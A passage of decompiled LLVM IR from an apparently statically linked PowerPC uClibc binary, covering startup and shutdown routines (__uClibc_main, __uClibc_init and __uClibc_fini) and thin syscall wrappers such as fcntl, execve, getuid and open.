  uselistorder i32 %v2_10006b28, { 2, 1, 0, 4, 3, 5, 6 }
  uselistorder i32 %v2_10006b04, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32 %v1_10006b00, { 1, 0 }
  uselistorder i32 %v2_10006ae4, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 9, 11, 10, 2, 25, 1, 12, 26, 13, 4, 5, 17, 19, 20, 18, 6, 7, 21, 3, 22, 8, 23, 15, 24, 16, 14, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 9, 8, 4, 0, 1, 7, 6, 5, 2, 3 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 9, 8, 4, 0, 1, 7, 6, 5, 2, 3 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder label %dec_label_pc_10006c80, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006c7c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006c48, { 1, 0 }
  uselistorder label %dec_label_pc_10006c3c, { 1, 0 }
  uselistorder label %dec_label_pc_10006b70.dec_label_pc_10006b70_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10006af0.dec_label_pc_10006af0_crit_edge, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006ce4:
  %v3_10006ce8 = load i32, i32* @global_var_1001d870.416, align 4
  %v3_10006cec = icmp eq i32 %v3_10006ce8, 0
  br i1 %v3_10006cec, label %dec_label_pc_10006cfc, label %dec_label_pc_10006cf4

dec_label_pc_10006cf4:                            ; preds = %dec_label_pc_10006ce4
  %v2_10006cf8 = load i32, i32* @r4, align 4
  %v3_10006cf8 = call i32 @unknown_0(i32 268566528, i32 %v2_10006cf8)
  store i32 %v3_10006cf8, i32* @r3, align 4
  br label %dec_label_pc_10006cfc

dec_label_pc_10006cfc:                            ; preds = %dec_label_pc_10006ce4, %dec_label_pc_10006cf4
  %v3_10006d00 = load i32, i32* @global_var_1001d874.417, align 4
  %v3_10006d04 = icmp eq i32 %v3_10006d00, 0
  br i1 %v3_10006d04, label %dec_label_pc_10006cfc.dec_label_pc_10006d14_crit_edge, label %dec_label_pc_10006d0c

dec_label_pc_10006cfc.dec_label_pc_10006d14_crit_edge: ; preds = %dec_label_pc_10006cfc
  %v0_10006d24.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006d14

dec_label_pc_10006d0c:                            ; preds = %dec_label_pc_10006cfc
  %v2_10006d10 = load i32, i32* @r4, align 4
  %v3_10006d10 = call i32 @unknown_0(i32 268566528, i32 %v2_10006d10)
  br label %dec_label_pc_10006d14

dec_label_pc_10006d14:                            ; preds = %dec_label_pc_10006cfc.dec_label_pc_10006d14_crit_edge, %dec_label_pc_10006d0c
  %v0_10006d24 = phi i32 [ %v0_10006d24.pre, %dec_label_pc_10006cfc.dec_label_pc_10006d14_crit_edge ], [ %v3_10006d10, %dec_label_pc_10006d0c ]
  ret i32 %v0_10006d24

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006d14, { 1, 0 }
  uselistorder label %dec_label_pc_10006cfc, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_10006d30 = load i32, i32* @r3, align 4
  ret i32 %v0_10006d30
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268463448, i32* @lr, align 4
  %v2_10006d54 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_10006d58 = icmp eq i32 %v2_10006d54, -1
  br i1 %v3_10006d58, label %dec_label_pc_10006d60, label %dec_label_pc_10006d80

dec_label_pc_10006d60:                            ; preds = %entry
  %v0_10006d64 = load i32, i32* @r30, align 4
  store i32 268463476, i32* @lr, align 4
  %v3_10006d70 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1000c90c.418 to i32), i32 %v0_10006d64)
  %v1_10006d74 = load i32, i32* @r31, align 4
  %v4_10006d74 = icmp eq i32 %v3_10006d70, %v1_10006d74
  br i1 %v4_10006d74, label %dec_label_pc_10006d80, label %dec_label_pc_10006d7c

dec_label_pc_10006d7c:                            ; preds = %dec_label_pc_10006d60
  %v1_10006d7c = call i32 @abort(i32 %v3_10006d70)
  br label %dec_label_pc_10006d80

dec_label_pc_10006d80:                            ; preds = %entry, %dec_label_pc_10006d60, %dec_label_pc_10006d7c
  %v0_10006d90 = phi i32 [ %v2_10006d54, %entry ], [ %v3_10006d70, %dec_label_pc_10006d60 ], [ %v1_10006d7c, %dec_label_pc_10006d7c ]
  ret i32 %v0_10006d90

; uselistorder directives
  uselistorder label %dec_label_pc_10006d80, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10006db4 = load i32, i32* @global_var_1001d878.419, align 4
  %v3_10006db8 = icmp eq i32 %v3_10006db4, 0
  br i1 %v3_10006db8, label %dec_label_pc_10006ddc, label %entry.dec_label_pc_10006e00_crit_edge

entry.dec_label_pc_10006e00_crit_edge:            ; preds = %entry
  %v0_10006e10.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006e00

dec_label_pc_10006ddc:                            ; preds = %entry
  store i32 1, i32* @global_var_1001d878.419, align 4
  store i32 4096, i32* @global_var_1001d86c.340, align 4
  %v1_10006dfc = call i32 @_stdio_init(i32 268448952)
  br label %dec_label_pc_10006e00

dec_label_pc_10006e00:                            ; preds = %entry.dec_label_pc_10006e00_crit_edge, %dec_label_pc_10006ddc
  %v0_10006e10 = phi i32 [ %v0_10006e10.pre, %entry.dec_label_pc_10006e00_crit_edge ], [ %v1_10006dfc, %dec_label_pc_10006ddc ]
  ret i32 %v0_10006e10

; uselistorder directives
  uselistorder label %dec_label_pc_10006e00, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_10006e2c = mul i32 %arg2, 4
  %v2_10006e30 = add i32 %tmp, %v1_10006e2c
  %v0_10006e34 = load i32, i32* @r9, align 4
  store i32 %v0_10006e34, i32* @global_var_1001d864.420, align 4
  %v1_10006e38 = add i32 %v2_10006e30, 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 %v1_10006e38, i32* @global_var_1001d868.414, align 4
  store i32 %arg6, i32* @global_var_1001d874.417, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_10006e58 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_10006e60 = icmp eq i32 %v1_10006e38, %v2_10006e58
  br i1 %v4_10006e60, label %dec_label_pc_10006e68, label %dec_label_pc_10006e6c

dec_label_pc_10006e68:                            ; preds = %entry
  store i32 %v2_10006e30, i32* @global_var_1001d868.414, align 4
  br label %dec_label_pc_10006e6c

dec_label_pc_10006e6c:                            ; preds = %entry, %dec_label_pc_10006e68
  %v2_10006e6c = ptrtoint i32* %stack_var_-168 to i32
  store i32 268463740, i32* @lr, align 4
  %v3_10006e78 = call i32 @__GI_memset(i32 %v2_10006e6c, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1001d868.414, align 4
  br label %dec_label_pc_10006e88

dec_label_pc_10006e88:                            ; preds = %dec_label_pc_10006e88, %dec_label_pc_10006e6c
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_10006e6c ], [ %v1_10006e8c, %dec_label_pc_10006e88 ]
  %v1_10006e88 = inttoptr i32 %storemerge to i32*
  %v2_10006e88 = load i32, i32* %v1_10006e88, align 4
  %v1_10006e8c = add i32 %storemerge, 4
  %v3_10006e90 = icmp eq i32 %v2_10006e88, 0
  br i1 %v3_10006e90, label %dec_label_pc_10006e98, label %dec_label_pc_10006e88

dec_label_pc_10006e98:                            ; preds = %dec_label_pc_10006e88
  store i32 %v1_10006e8c, i32* %r29.global-to-local, align 4
  %v1_10006ec412 = inttoptr i32 %v1_10006e8c to i32*
  %v2_10006ec413 = load i32, i32* %v1_10006ec412, align 4
  %v3_10006ec816 = icmp eq i32 %v2_10006ec413, 0
  br i1 %v3_10006ec816, label %dec_label_pc_10006ed0, label %dec_label_pc_10006ea0

dec_label_pc_10006ea0:                            ; preds = %dec_label_pc_10006e98, %dec_label_pc_10006ec0
  %v0_10006eb4 = phi i32 [ %v1_10006ec0, %dec_label_pc_10006ec0 ], [ %v1_10006e8c, %dec_label_pc_10006e98 ]
  %v0_10006ea8 = phi i32 [ %v2_10006ec4, %dec_label_pc_10006ec0 ], [ %v2_10006ec413, %dec_label_pc_10006e98 ]
  %v2_10006ea0 = icmp ugt i32 %v0_10006ea8, 14
  br i1 %v2_10006ea0, label %dec_label_pc_10006ec0, label %dec_label_pc_10006ea8

dec_label_pc_10006ea8:                            ; preds = %dec_label_pc_10006ea0
  %v1_10006ea8 = mul i32 %v0_10006ea8, 8
  %v2_10006eb0 = add i32 %v1_10006ea8, %v2_10006e6c
  store i32 %v2_10006eb0, i32* @r3, align 4
  store i32 %v0_10006eb4, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268463808, i32* @lr, align 4
  %v0_10006ebc = call i32 @memcpy()
  %v0_10006ec0.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10006ec0

dec_label_pc_10006ec0:                            ; preds = %dec_label_pc_10006ea0, %dec_label_pc_10006ea8
  %v0_10006ec0 = phi i32 [ %v0_10006eb4, %dec_label_pc_10006ea0 ], [ %v0_10006ec0.pre, %dec_label_pc_10006ea8 ]
  %v1_10006ec0 = add i32 %v0_10006ec0, 8
  store i32 %v1_10006ec0, i32* %r29.global-to-local, align 4
  %v1_10006ec4 = inttoptr i32 %v1_10006ec0 to i32*
  %v2_10006ec4 = load i32, i32* %v1_10006ec4, align 4
  %v3_10006ec8 = icmp eq i32 %v2_10006ec4, 0
  br i1 %v3_10006ec8, label %dec_label_pc_10006ed0, label %dec_label_pc_10006ea0

dec_label_pc_10006ed0:                            ; preds = %dec_label_pc_10006ec0, %dec_label_pc_10006e98
  %v1_10006ed4 = call i32 @_dl_aux_init(i32 %v2_10006e6c)
  store i32 %v1_10006ed4, i32* @r3, align 4
  store i32 268463836, i32* @lr, align 4
  %v1_10006ed8 = call i32 @__GI___uClibc_init(i32 %v1_10006ed4)
  %v3_10006ee0 = icmp eq i32 %tmp27, 0
  br i1 %v3_10006ee0, label %dec_label_pc_10006ee8, label %dec_label_pc_10006eec

dec_label_pc_10006ee8:                            ; preds = %dec_label_pc_10006ed0
  br label %dec_label_pc_10006eec

dec_label_pc_10006eec:                            ; preds = %dec_label_pc_10006ed0, %dec_label_pc_10006ee8
  %v0_10006ef4 = phi i32 [ %tmp27, %dec_label_pc_10006ed0 ], [ 4096, %dec_label_pc_10006ee8 ]
  store i32 %v0_10006ef4, i32* @global_var_1001d86c.340, align 4
  %v3_10006ef8 = icmp eq i32 %tmp26, -1
  br i1 %v3_10006ef8, label %dec_label_pc_10006f00, label %dec_label_pc_10006f34

dec_label_pc_10006f00:                            ; preds = %dec_label_pc_10006eec
  store i32 268463876, i32* @lr, align 4
  %v1_10006f00 = call i32 @getuid(i32 268566528)
  store i32 %v1_10006f00, i32* %r29.global-to-local, align 4
  store i32 268463884, i32* @lr, align 4
  %v0_10006f08 = call i32 @geteuid()
  %v4_10006f0c = icmp eq i32 %v1_10006f00, %v0_10006f08
  br i1 %v4_10006f0c, label %dec_label_pc_10006f14, label %dec_label_pc_10006f50

dec_label_pc_10006f14:                            ; preds = %dec_label_pc_10006f00
  store i32 268463896, i32* @lr, align 4
  %v1_10006f14 = call i32 @getgid(i32 %v0_10006f08)
  store i32 %v1_10006f14, i32* %r29.global-to-local, align 4
  store i32 268463904, i32* @lr, align 4
  %v0_10006f1c = call i32 @getegid()
  %v4_10006f20 = icmp eq i32 %v1_10006f14, %v0_10006f1c
  br i1 %v4_10006f20, label %dec_label_pc_10006f28.thread, label %dec_label_pc_10006f50

dec_label_pc_10006f28.thread:                     ; preds = %dec_label_pc_10006f14
  br label %dec_label_pc_10006f80

dec_label_pc_10006f34:                            ; preds = %dec_label_pc_10006eec
  %v4_10006f38 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10006f38, label %dec_label_pc_10006f40, label %dec_label_pc_10006f50

dec_label_pc_10006f40:                            ; preds = %dec_label_pc_10006f34
  br label %dec_label_pc_10006f50

dec_label_pc_10006f50:                            ; preds = %dec_label_pc_10006f40, %dec_label_pc_10006f34, %dec_label_pc_10006f14, %dec_label_pc_10006f00
  store i32 268463968, i32* @lr, align 4
  %v2_10006f5c = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268463984, i32* @lr, align 4
  %v2_10006f6c = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268464000, i32* @lr, align 4
  %v2_10006f7c = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_10006f80

dec_label_pc_10006f80:                            ; preds = %dec_label_pc_10006f28.thread, %dec_label_pc_10006f50
  %v0_10006f8c = load i32, i32* @r30, align 4
  %v1_10006f8c = inttoptr i32 %v0_10006f8c to i32*
  %v2_10006f8c = load i32, i32* %v1_10006f8c, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_10006f8c, i32* inttoptr (i32 268556288 to i32*), align 2048
  %v0_10006fac = load i32, i32* @r27, align 4
  store i32 %v0_10006fac, i32* @global_var_1001d870.416, align 4
  br i1 false, label %dec_label_pc_10006fb4, label %dec_label_pc_1000702c

dec_label_pc_10006fb4:                            ; preds = %dec_label_pc_10006f80, %dec_label_pc_10006fb4
  br i1 undef, label %dec_label_pc_10006fb4, label %dec_label_pc_1000702c

dec_label_pc_1000702c:                            ; preds = %dec_label_pc_10006fb4, %dec_label_pc_10006f80
  %v0_10006fd8 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_10006fd8)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000703c = call i32 @__errno_location()
  %v2_10007044 = inttoptr i32 %v0_1000703c to i32*
  store i32 0, i32* %v2_10007044, align 4
  %v0_10007058 = call i32 @__GI___h_errno_location()
  %v2_10007060 = inttoptr i32 %v0_10007058 to i32*
  store i32 0, i32* %v2_10007060, align 4
  %v0_10007070 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_10007070)
  %v0_1000707c = call i32 @__GI_exit()
  ret i32 %v0_1000707c

; uselistorder directives
  uselistorder i32 %v2_10006ec4, { 1, 0 }
  uselistorder i32 %v1_10006ec0, { 2, 1, 0 }
  uselistorder i32 %v1_10006e8c, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10006e6c, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 7, 6, 0, 5 }
  uselistorder i32 ()* @__GI_exit, { 0, 10, 2, 1, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 4096, { 0, 2, 5, 6, 1, 4, 3 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10006fb4, { 1, 0 }
  uselistorder label %dec_label_pc_10006f80, { 1, 0 }
  uselistorder label %dec_label_pc_10006eec, { 1, 0 }
  uselistorder label %dec_label_pc_10006ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10006ea0, { 1, 0 }
  uselistorder label %dec_label_pc_10006e6c, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10007088 = load i32, i32* @lr, align 4
  %v1_10007088 = load i1, i1* @cr0_so, align 1
  %v2_10007088 = xor i1 %v1_10007088, true
  call void @__pseudo_cond_branch(i1 %v2_10007088, i32 %v0_10007088)
  %v0_1000708c = call i32 @__syscall_error()
  ret i32 %v0_1000708c
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100070a8 = call i32 @__asm_mfcr()
  %v1_100070ac = and i32 %v0_100070a8, 268435456
  %v3_100070ac = icmp eq i32 %v1_100070ac, 0
  store i32 %v0_100070a8, i32* %r31.global-to-local, align 4
  br i1 %v3_100070ac, label %dec_label_pc_100070c4, label %dec_label_pc_100070b8

dec_label_pc_100070b8:                            ; preds = %entry
  %v0_100070b8 = call i32 @__errno_location()
  %v0_100070bc = load i32, i32* %r31.global-to-local, align 4
  %v2_100070bc = inttoptr i32 %v0_100070b8 to i32*
  store i32 %v0_100070bc, i32* %v2_100070bc, align 4
  br label %dec_label_pc_100070c4

dec_label_pc_100070c4:                            ; preds = %entry, %dec_label_pc_100070b8
  %v0_100070d4 = phi i32 [ %v0_100070a8, %entry ], [ -1, %dec_label_pc_100070b8 ]
  ret i32 %v0_100070d4

; uselistorder directives
  uselistorder label %dec_label_pc_100070c4, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100070ec = add i32 %arg2, -12
  %v2_100070f0 = icmp ugt i32 %v1_100070ec, 2
  %v2_100070f8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100070f8, i32* %stack_var_-32, align 4
  br i1 %v2_100070f0, label %dec_label_pc_10007124, label %dec_label_pc_10007114

dec_label_pc_10007114:                            ; preds = %entry
  store i32 268464412, i32* @lr, align 4
  %v2_10007118 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_10007118, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007144

dec_label_pc_10007124:                            ; preds = %entry
  %v0_10007128 = call i32 @__asm_mfcr()
  %v1_1000712c = and i32 %v0_10007128, 268435456
  %v3_1000712c = icmp eq i32 %v1_1000712c, 0
  store i32 %v0_10007128, i32* %r31.global-to-local, align 4
  br i1 %v3_1000712c, label %dec_label_pc_10007144, label %dec_label_pc_10007138

dec_label_pc_10007138:                            ; preds = %dec_label_pc_10007124
  %v0_10007138 = call i32 @__errno_location()
  %v0_1000713c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000713c = inttoptr i32 %v0_10007138 to i32*
  store i32 %v0_1000713c, i32* %v2_1000713c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007144

dec_label_pc_10007144:                            ; preds = %dec_label_pc_10007124, %dec_label_pc_10007114, %dec_label_pc_10007138
  %v0_10007148 = phi i32 [ %v0_10007128, %dec_label_pc_10007124 ], [ %v2_10007118, %dec_label_pc_10007114 ], [ -1, %dec_label_pc_10007138 ]
  ret i32 %v0_10007148

; uselistorder directives
  uselistorder i32 -12, { 5, 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10007144, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_10007174 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007174, i32* %stack_var_-32, align 4
  %v0_10007190 = call i32 @__asm_mfcr()
  %v1_10007194 = and i32 %v0_10007190, 268435456
  %v3_10007194 = icmp eq i32 %v1_10007194, 0
  store i32 %v0_10007190, i32* %r31.global-to-local, align 4
  br i1 %v3_10007194, label %dec_label_pc_100071ac, label %dec_label_pc_100071a0

dec_label_pc_100071a0:                            ; preds = %entry
  %v0_100071a0 = call i32 @__errno_location()
  %v0_100071a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100071a4 = inttoptr i32 %v0_100071a0 to i32*
  store i32 %v0_100071a4, i32* %v2_100071a4, align 4
  br label %dec_label_pc_100071ac

dec_label_pc_100071ac:                            ; preds = %entry, %dec_label_pc_100071a0
  %v0_100071bc = phi i32 [ %v0_10007190, %entry ], [ -1, %dec_label_pc_100071a0 ]
  ret i32 %v0_100071bc

; uselistorder directives
  uselistorder label %dec_label_pc_100071ac, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_100071d4

dec_label_pc_100071d4:                            ; preds = %dec_label_pc_100071d4.backedge, %entry
  %v0_100071e0 = call i32 @__asm_mfcr()
  %v1_100071e4 = and i32 %v0_100071e0, 268435456
  %v3_100071e4 = icmp eq i32 %v1_100071e4, 0
  store i32 %v0_100071e0, i32* %r31.global-to-local, align 4
  br i1 %v3_100071e4, label %dec_label_pc_100071d4.backedge, label %dec_label_pc_100071f0

dec_label_pc_100071f0:                            ; preds = %dec_label_pc_100071d4
  %v0_100071f0 = call i32 @__errno_location()
  %v0_100071f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100071f4 = inttoptr i32 %v0_100071f0 to i32*
  store i32 %v0_100071f4, i32* %v2_100071f4, align 4
  br label %dec_label_pc_100071d4.backedge

dec_label_pc_100071d4.backedge:                   ; preds = %dec_label_pc_100071f0, %dec_label_pc_100071d4
  br label %dec_label_pc_100071d4
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007214 = call i32 @__asm_mfcr()
  %v1_10007218 = and i32 %v0_10007214, 268435456
  %v3_10007218 = icmp eq i32 %v1_10007218, 0
  store i32 %v0_10007214, i32* %r31.global-to-local, align 4
  br i1 %v3_10007218, label %dec_label_pc_10007230, label %dec_label_pc_10007224

dec_label_pc_10007224:                            ; preds = %entry
  %v0_10007224 = call i32 @__errno_location()
  %v0_10007228 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007228 = inttoptr i32 %v0_10007224 to i32*
  store i32 %v0_10007228, i32* %v2_10007228, align 4
  br label %dec_label_pc_10007230

dec_label_pc_10007230:                            ; preds = %entry, %dec_label_pc_10007224
  %v0_10007240 = phi i32 [ %v0_10007214, %entry ], [ -1, %dec_label_pc_10007224 ]
  ret i32 %v0_10007240

; uselistorder directives
  uselistorder label %dec_label_pc_10007230, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000725c = call i32 @__asm_mfcr()
  %v1_10007260 = and i32 %v0_1000725c, 268435456
  %v3_10007260 = icmp eq i32 %v1_10007260, 0
  store i32 %v0_1000725c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007260, label %dec_label_pc_10007278, label %dec_label_pc_1000726c

dec_label_pc_1000726c:                            ; preds = %entry
  %v0_1000726c = call i32 @__errno_location()
  %v0_10007270 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007270 = inttoptr i32 %v0_1000726c to i32*
  store i32 %v0_10007270, i32* %v2_10007270, align 4
  br label %dec_label_pc_10007278

dec_label_pc_10007278:                            ; preds = %entry, %dec_label_pc_1000726c
  %v0_10007288 = phi i32 [ %v0_1000725c, %entry ], [ -1, %dec_label_pc_1000726c ]
  ret i32 %v0_10007288

; uselistorder directives
  uselistorder label %dec_label_pc_10007278, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100072a4 = call i32 @__asm_mfcr()
  %v1_100072a8 = and i32 %v0_100072a4, 268435456
  %v3_100072a8 = icmp eq i32 %v1_100072a8, 0
  store i32 %v0_100072a4, i32* %r31.global-to-local, align 4
  br i1 %v3_100072a8, label %dec_label_pc_100072c0, label %dec_label_pc_100072b4

dec_label_pc_100072b4:                            ; preds = %entry
  %v0_100072b4 = call i32 @__errno_location()
  %v0_100072b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100072b8 = inttoptr i32 %v0_100072b4 to i32*
  store i32 %v0_100072b8, i32* %v2_100072b8, align 4
  br label %dec_label_pc_100072c0

dec_label_pc_100072c0:                            ; preds = %entry, %dec_label_pc_100072b4
  %v0_100072d0 = phi i32 [ %v0_100072a4, %entry ], [ -1, %dec_label_pc_100072b4 ]
  ret i32 %v0_100072d0

; uselistorder directives
  uselistorder label %dec_label_pc_100072c0, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100072ec = call i32 @__asm_mfcr()
  %v1_100072f0 = and i32 %v0_100072ec, 268435456
  %v3_100072f0 = icmp eq i32 %v1_100072f0, 0
  store i32 %v0_100072ec, i32* %r31.global-to-local, align 4
  br i1 %v3_100072f0, label %dec_label_pc_10007308, label %dec_label_pc_100072fc

dec_label_pc_100072fc:                            ; preds = %entry
  %v0_100072fc = call i32 @__errno_location()
  %v0_10007300 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007300 = inttoptr i32 %v0_100072fc to i32*
  store i32 %v0_10007300, i32* %v2_10007300, align 4
  br label %dec_label_pc_10007308

dec_label_pc_10007308:                            ; preds = %entry, %dec_label_pc_100072fc
  %v0_10007318 = phi i32 [ %v0_100072ec, %entry ], [ -1, %dec_label_pc_100072fc ]
  ret i32 %v0_10007318

; uselistorder directives
  uselistorder label %dec_label_pc_10007308, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007334 = call i32 @__asm_mfcr()
  %v1_10007338 = and i32 %v0_10007334, 268435456
  %v3_10007338 = icmp eq i32 %v1_10007338, 0
  store i32 %v0_10007334, i32* %r31.global-to-local, align 4
  br i1 %v3_10007338, label %dec_label_pc_10007350, label %dec_label_pc_10007344

dec_label_pc_10007344:                            ; preds = %entry
  %v0_10007344 = call i32 @__errno_location()
  %v0_10007348 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007348 = inttoptr i32 %v0_10007344 to i32*
  store i32 %v0_10007348, i32* %v2_10007348, align 4
  br label %dec_label_pc_10007350

dec_label_pc_10007350:                            ; preds = %entry, %dec_label_pc_10007344
  %v0_10007360 = phi i32 [ %v0_10007334, %entry ], [ -1, %dec_label_pc_10007344 ]
  ret i32 %v0_10007360

; uselistorder directives
  uselistorder label %dec_label_pc_10007350, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000737c = call i32 @__asm_mfcr()
  %v1_10007380 = and i32 %v0_1000737c, 268435456
  %v3_10007380 = icmp eq i32 %v1_10007380, 0
  store i32 %v0_1000737c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007380, label %dec_label_pc_10007398, label %dec_label_pc_1000738c

dec_label_pc_1000738c:                            ; preds = %entry
  %v0_1000738c = call i32 @__errno_location()
  %v0_10007390 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007390 = inttoptr i32 %v0_1000738c to i32*
  store i32 %v0_10007390, i32* %v2_10007390, align 4
  br label %dec_label_pc_10007398

dec_label_pc_10007398:                            ; preds = %entry, %dec_label_pc_1000738c
  %v0_100073a8 = phi i32 [ %v0_1000737c, %entry ], [ -1, %dec_label_pc_1000738c ]
  ret i32 %v0_100073a8

; uselistorder directives
  uselistorder label %dec_label_pc_10007398, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100073c0 = and i32 %arg2, 64
  %v3_100073c0 = icmp eq i32 %v1_100073c0, 0
  br i1 %v3_100073c0, label %dec_label_pc_100073ec, label %dec_label_pc_100073d0

dec_label_pc_100073d0:                            ; preds = %entry
  %v2_100073d8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100073d8, i32* %stack_var_-32, align 4
  %v0_100073e8 = load i32, i32* @r5, align 4
  br label %dec_label_pc_100073ec

dec_label_pc_100073ec:                            ; preds = %entry, %dec_label_pc_100073d0
  %v0_100073ec = phi i32 [ 0, %entry ], [ %v0_100073e8, %dec_label_pc_100073d0 ]
  store i32 %v0_100073ec, i32* @r5, align 4
  %v0_100073f4 = call i32 @__asm_mfcr()
  %v1_100073f8 = and i32 %v0_100073f4, 268435456
  %v3_100073f8 = icmp eq i32 %v1_100073f8, 0
  store i32 %v0_100073f4, i32* %r31.global-to-local, align 4
  br i1 %v3_100073f8, label %dec_label_pc_10007410, label %dec_label_pc_10007404

dec_label_pc_10007404:                            ; preds = %dec_label_pc_100073ec
  %v0_10007404 = call i32 @__errno_location()
  %v0_10007408 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007408 = inttoptr i32 %v0_10007404 to i32*
  store i32 %v0_10007408, i32* %v2_10007408, align 4
  br label %dec_label_pc_10007410

dec_label_pc_10007410:                            ; preds = %dec_label_pc_100073ec, %dec_label_pc_10007404
